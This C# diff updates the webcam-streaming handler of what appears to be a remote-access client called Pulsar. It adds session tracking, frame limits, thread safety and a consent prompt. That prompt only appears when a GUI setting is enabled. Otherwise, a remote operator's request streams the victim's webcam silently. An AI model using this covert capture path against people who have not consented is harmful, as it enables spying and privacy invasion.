@@ -12,6 +12,7 @@ using System.Diagnostics;
 using Pulsar.Common.Messages.Webcam;
 using Pulsar.Common.Messages.Other;
 using System.Collections.Concurrent;
+using Pulsar.Client.Config;
 
 namespace Pulsar.Client.Messages
 {    
@@ -23,6 +24,7 @@ namespace Pulsar.Client.Messages
         private ISender _clientMain;
         private Thread _captureThread;
         private WebcamHelper _webcamHelper;
+        private readonly object _sessionLock = new object();
 
         private WebcamHelper WebcamHelper
         {
@@ -39,7 +41,7 @@ namespace Pulsar.Client.Messages
         private CancellationTokenSource _cancellationTokenSource;
 
         // frame control variables
-        private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
+        private readonly ConcurrentQueue<BufferedFrame> _frameBuffer = new ConcurrentQueue<BufferedFrame>();
         private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
         private int _pendingFrameRequests = 0;
 
@@ -52,6 +54,16 @@ namespace Pulsar.Client.Messages
         private bool _sendFrameRateNext = false;
 
         private MemoryStream _reusableStream;
+
+        private string _sessionId;
+        private long _frameSequence;
+        private bool _disposed;
+
+        private sealed class BufferedFrame
+        {
+            public byte[] Data;
+            public long Timestamp;
+        }
 
         private MemoryStream ReusableStream
         {
@@ -85,9 +97,16 @@ namespace Pulsar.Client.Messages
 
         private void Execute(ISender client, GetWebcam message)
         {
+            if (_disposed)
+                return;
+
             if (message.Status == RemoteWebcamStatus.Stop)
             {
-                StopWebcamStreaming();
+                if (string.IsNullOrWhiteSpace(message.SessionId) ||
+                    string.Equals(message.SessionId, _sessionId, StringComparison.Ordinal))
+                {
+                    StopWebcamStreaming();
+                }
             }
             else if (message.Status == RemoteWebcamStatus.Start)
             {
@@ -95,8 +114,16 @@ namespace Pulsar.Client.Messages
             }
             else if (message.Status == RemoteWebcamStatus.Continue)
             {
+                if (!string.IsNullOrWhiteSpace(message.SessionId) &&
+                    !string.Equals(message.SessionId, _sessionId, StringComparison.Ordinal))
+                {
+                    Debug.WriteLine("Ignoring continue request for a stale webcam session.");
+                    return;
+                }
+
                 // server is requesting more frames
-                Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
+                int framesRequested = Math.Max(1, Math.Min(message.FramesRequested, 12));
+                Interlocked.Add(ref _pendingFrameRequests, framesRequested);
                 _frameRequestEvent.Set();
             }
         }
@@ -105,19 +132,65 @@ namespace Pulsar.Client.Messages
         {
             try
             {
+                lock (_sessionLock)
+                {
+                    if (_disposed)
+                        return;
+
+                    if (_captureThread != null && _captureThread.IsAlive)
+                    {
+                        StopWebcamStreamingCore(sendStoppedStatus: false);
+                    }
+                }
+
+                if (Settings.SHOWCLIENTGUI)
+                {
+                    bool allowed = GUI.RemoteDesktopPermissionPrompt.RequestUserConsent(
+                        30,
+                        "Remote Webcam",
+                        "A remote operator is requesting to view your webcam.");
+                    if (!allowed)
+                    {
+                        SendWebcamStatus(client, message.SessionId, MediaStreamStatus.Denied,
+                            "MEDIA_CONSENT_DENIED", "Denied by user.");
+                        return;
+                    }
+                }
+
                 try
                 {
-                    WebcamHelper.StartWebcam(message.DisplayIndex);
+                    if (!WebcamHelper.StartWebcam(message.DisplayIndex))
+                    {
+                        SendWebcamStatus(client, message.SessionId, MediaStreamStatus.Unavailable,
+                            "WEBCAM_UNAVAILABLE", "The webcam could not be started.");
+                        return;
+                    }
                 }
                 catch (Exception ex)
                 {
                     Debug.WriteLine($"Error starting webcam: {ex.Message}");
                     OnReport("Failed to start webcam: " + ex.Message);
+                    SendWebcamStatus(client, message.SessionId, MediaStreamStatus.Error,
+                        "WEBCAM_START_FAILED", ex.Message);
                     return;
                 }
                 Debug.WriteLine("Starting remote webcam session");
 
-                var webcamBounds = WebcamHelper.GetBounds();
+                Bounds webcamBounds = WebcamHelper.GetBounds();
+                var deadline = DateTime.UtcNow.AddSeconds(2);
+                while ((webcamBounds.Width <= 0 || webcamBounds.Height <= 0) &&
+                       DateTime.UtcNow < deadline)
+                {
+                    Thread.Sleep(50);
+                    webcamBounds = WebcamHelper.GetBounds();
+                }
+                if (webcamBounds.Width <= 0 || webcamBounds.Height <= 0)
+                {
+                    WebcamHelper.StopWebcam();
+                    SendWebcamStatus(client, message.SessionId, MediaStreamStatus.Unavailable,
+                        "WEBCAM_NO_FRAME", "The webcam opened but no valid frame was available.");
+                    return;
+                }
                 var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };
 
                 try
@@ -146,10 +219,15 @@ namespace Pulsar.Client.Messages
                 }
 
                 _clientMain = client;
+                _sessionId = string.IsNullOrWhiteSpace(message.SessionId)
+                    ? Guid.NewGuid().ToString("N")
+                    : message.SessionId;
+                Interlocked.Exchange(ref _frameSequence, 0);
 
                 // clear any pending frame requests and existing frames
                 ClearFrameBuffer();
-                Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);
+                int initialFrames = Math.Max(1, Math.Min(message.FramesRequested, 12));
+                Interlocked.Exchange(ref _pendingFrameRequests, initialFrames);
 
                 if (_captureThread == null || !_captureThread.IsAlive)
                 {
@@ -175,8 +253,17 @@ namespace Pulsar.Client.Messages
 
         private void StopWebcamStreaming()
         {
+            lock (_sessionLock)
+            {
+                StopWebcamStreamingCore(sendStoppedStatus: true);
+            }
+        }
+
+        private void StopWebcamStreamingCore(bool sendStoppedStatus)
+        {
             try
             {
+                string stoppedSessionId = _sessionId;
                 try
                 {
                     WebcamHelper.StopWebcam();
@@ -188,13 +275,18 @@ namespace Pulsar.Client.Messages
                 Debug.WriteLine("Stopping remote webcam session");
 
                 _cancellationTokenSource?.Cancel();
+                var cts = _cancellationTokenSource;
+                _cancellationTokenSource = null;
 
                 if (_captureThread != null && _captureThread.IsAlive)
                 {
                     try
                     {
                         _frameRequestEvent.Set(); // wake up thread
-                        _captureThread.Join();
+                        if (!_captureThread.Join(1000))
+                        {
+                            Debug.WriteLine("Capture thread did not stop within the timeout.");
+                        }
                     }
                     catch (Exception ex)
                     {
@@ -240,10 +332,17 @@ namespace Pulsar.Client.Messages
                     }
                     _streamCodec = null;
                 }
+                cts?.Dispose();
 
                 // clear the buffer
                 ClearFrameBuffer();
                 Interlocked.Exchange(ref _pendingFrameRequests, 0);
+                if (sendStoppedStatus && _clientMain != null)
+                {
+                    SendWebcamStatus(_clientMain, stoppedSessionId, MediaStreamStatus.Stopped,
+                        null, null);
+                }
+                _sessionId = null;
             }
             catch (Exception ex)
             {
@@ -277,7 +376,11 @@ namespace Pulsar.Client.Messages
                     byte[] frameData = CaptureFrame();
                     if (frameData != null)
                     {
-                        _frameBuffer.Enqueue(frameData);
+                        _frameBuffer.Enqueue(new BufferedFrame
+                        {
+                            Data = frameData,
+                            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
+                        });
 
                         // increment frame counter for statistics
                         _frameCount++;
@@ -292,7 +395,7 @@ namespace Pulsar.Client.Messages
                     }
 
                     // send frames if we have pending requests
-                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
+                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out BufferedFrame frameToSend))
                     {
                         SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                     }
@@ -309,45 +412,47 @@ namespace Pulsar.Client.Messages
         
         private byte[] CaptureFrame()
         {
+            Bitmap webcam = null;
+            BitmapData webcamData = null;
             try
             {
-                _webcam = WebcamHelper.GetLatestFrame();
+                webcam = WebcamHelper.GetLatestFrame();
 
-                if (_webcam == null)
+                if (webcam == null)
                 {
                     return null;
                 }
 
                 const PixelFormat codecPixelFormat = PixelFormat.Format32bppArgb;
-                Bitmap processedBitmap = _webcam;
+                Bitmap processedBitmap = webcam;
                 
-                if (_webcam.PixelFormat != codecPixelFormat)
+                if (webcam.PixelFormat != codecPixelFormat)
                 {
                     try
                     {
-                        processedBitmap = new Bitmap(_webcam.Width, _webcam.Height, codecPixelFormat);
+                        processedBitmap = new Bitmap(webcam.Width, webcam.Height, codecPixelFormat);
                         using (Graphics g = Graphics.FromImage(processedBitmap))
                         {
-                            g.DrawImage(_webcam, 0, 0, _webcam.Width, _webcam.Height);
+                            g.DrawImage(webcam, 0, 0, webcam.Width, webcam.Height);
                         }
-                        _webcam.Dispose();
-                        _webcam = processedBitmap;
+                        webcam.Dispose();
+                        webcam = processedBitmap;
                     }
                     catch (Exception ex)
                     {
                         Debug.WriteLine($"Error converting pixel format: {ex.Message}");
-                        processedBitmap = _webcam;
+                        processedBitmap = webcam;
                     }
                 }
 
-                _webcamData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                webcamData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                     ImageLockMode.ReadWrite, processedBitmap.PixelFormat);
 
                 ReusableStream.Position = 0;
                 ReusableStream.SetLength(0);
 
                 if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
-                _streamCodec.CodeImage(_webcamData.Scan0,
+                _streamCodec.CodeImage(webcamData.Scan0,
                     new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                     new Size(processedBitmap.Width, processedBitmap.Height),
                     processedBitmap.PixelFormat, ReusableStream);
@@ -361,18 +466,24 @@ namespace Pulsar.Client.Messages
             }
             finally
             {
-                if (_webcamData != null)
+                if (webcamData != null && webcam != null)
                 {
-                    _webcam.UnlockBits(_webcamData);
-                    _webcamData = null;
+                    try
+                    {
+                        webcam.UnlockBits(webcamData);
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error unlocking webcam bits: {ex.Message}");
+                    }
                 }
-                _webcam?.Dispose();
-                _webcam = null;
+                webcam?.Dispose();
             }
         }
         
-        private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
+        private void SendFrameToServer(BufferedFrame frame, bool isLastRequestedFrame)
         {
+            byte[] frameData = frame?.Data;
             if (frameData == null || _clientMain == null) return;
 
             try
@@ -384,7 +495,11 @@ namespace Pulsar.Client.Messages
                     Monitor = _streamCodec.Monitor,
                     Resolution = _streamCodec.Resolution,
                     IsLastRequestedFrame = isLastRequestedFrame,
-                    FrameRate = 0f
+                    FrameRate = 0f,
+                    SessionId = _sessionId,
+                    Sequence = Interlocked.Increment(ref _frameSequence),
+                    Timestamp = frame.Timestamp,
+                    Status = MediaStreamStatus.Active
                 };
 
                 if (_sendFrameRateNext)
@@ -406,6 +521,23 @@ namespace Pulsar.Client.Messages
             while (_frameBuffer.TryDequeue(out _)) { }
         }
 
+        private void SendWebcamStatus(ISender client, string sessionId, MediaStreamStatus status,
+            string errorCode, string errorMessage)
+        {
+            if (client == null)
+                return;
+
+            client.Send(new GetWebcamResponse
+            {
+                SessionId = sessionId,
+                Sequence = Interlocked.Increment(ref _frameSequence),
+                Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
+                Status = status,
+                ErrorCode = errorCode,
+                ErrorMessage = errorMessage
+            });
+        }
+
         private void Execute(ISender client, GetAvailableWebcams message)
         {
             client.Send(new GetAvailableWebcamsResponse { Webcams = WebcamHelper.GetWebcams() });
@@ -424,11 +556,18 @@ namespace Pulsar.Client.Messages
         {
             if (disposing)
             {
-                StopWebcamStreaming();
-                _streamCodec?.Dispose();
-                _cancellationTokenSource?.Dispose();
-                _frameRequestEvent?.Dispose();
-                _reusableStream?.Dispose();
+                lock (_sessionLock)
+                {
+                    _disposed = true;
+                    StopWebcamStreamingCore(sendStoppedStatus: false);
+                    _streamCodec?.Dispose();
+                    _streamCodec = null;
+                    _cancellationTokenSource?.Dispose();
+                    _cancellationTokenSource = null;
+                    _frameRequestEvent?.Dispose();
+                    _reusableStream?.Dispose();
+                    _reusableStream = null;
+                }
             }
         }
     }
